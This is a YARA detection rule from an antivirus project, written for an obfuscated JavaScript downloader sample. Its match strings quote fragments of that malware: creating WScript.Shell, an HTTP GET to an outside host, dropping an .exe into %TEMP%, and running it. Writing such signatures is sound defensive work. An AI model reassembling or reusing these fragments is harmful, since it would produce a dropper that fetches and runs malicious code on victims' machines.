rule sig_20160330_1a0a5574b3f6d62547de11ef6befb3fc {
  meta:
    description = "datamaliciousorder - file 20160330_1a0a5574b3f6d62547de11ef6befb3fc.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6443368f5576920bf09a9e2f191a6dfd1f139b2af1d758a6d96a4077d7d4287b"

  strings:
    $s1  = "function _V(_CM, _X0){_EN = _EN * 1; return _CM - _X0;};" fullword ascii
    $s2  = "var _C = function _WS() {return WScript[_UR](\"WScript\"+\".Shell\");}(), _QU = 11;" fullword ascii
    $s3  = "_Q[_Y](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s4  = "if (_Q[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _U(){return _H + \"\";};" fullword ascii
    $s6  = "function _D() {return _C[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ajtwUcpo.ex\" + \"e\";};" fullword ascii
    $s7  = "function _G() {return ((_AH == true) && (_AH == _ML)) ? 1 : _EN;};" fullword ascii
    $s8  = "function _B(_O0){_C[\"Run\"](_O0, _EN, _EN);};" fullword ascii
    $s9  = " while (_D1){" fullword ascii
    $s10 = "function _F(){return 22;};" fullword ascii
    $s11 = "var _MR = new this[\"Date\"]();" fullword ascii
    $s12 = "function _R()" fullword ascii
    $s13 = "function _UO(_UM) {var _X = (1, 2, 3, 4, 5, _UM); return _X;};" fullword ascii
    $s14 = "return _V(_PU, _Z);" fullword ascii
    $s15 = "function _D0(){return _UR;};" fullword ascii
    $s16 = "var _ML = false;" fullword ascii
    $s17 = "var _AH = false;" fullword ascii
    $s18 = "var _L = false;" fullword ascii
    $s19 = "_AH = true; " fullword ascii
    $s20 = "_ML = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}